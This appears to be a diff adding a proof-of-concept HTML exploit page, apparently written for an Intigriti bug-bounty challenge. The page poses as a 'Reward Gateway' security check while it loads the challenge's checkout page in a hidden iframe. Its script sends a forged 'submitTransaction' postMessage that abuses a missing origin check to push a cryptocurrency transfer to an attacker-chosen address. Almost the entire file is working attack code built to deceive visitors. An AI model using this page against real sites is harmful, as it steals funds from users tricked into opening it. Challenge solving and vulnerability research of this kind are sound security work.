@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reward Gateway - Security Verification</title>
+</head>
+<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h1>Processing Security Check...</h1>
+    <p>Please do not close this window.</p>
+
+    <!-- The target checkout page in a hidden iframe -->
+    <iframe 
+        id="targetFrame" 
+        src="https://challenge-0126.intigriti.io/checkout.html?currency=XMR&price=150" 
+        style="display:none;">
+    </iframe>
+
+    <script>
+        const targetOrigin = "https://challenge-0126.intigriti.io";
+        const frame = document.getElementById('targetFrame');
+
+        // Wait for the checkout page to load its scripts
+        frame.onload = function() {
+            console.log("Iframe loaded, sending exploit payload...");
+
+            // This payload triggers the 'submitTransaction' listener in checkout.html
+            // Because there is no check on event.origin, the frame accepts our data
+            const payload = {
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: "16fcc05bfda75b38e3f12d6274854e4f25",
+                    currency: "XMR",
+                    amount: 1
+                }
+            };
+
+            // Send the message to the vulnerable window
+            frame.contentWindow.postMessage(payload, "*");
+            
+            alert("Transaction Request Sent Successfully!");
+        };
+    </script>
+</body>
+</html>
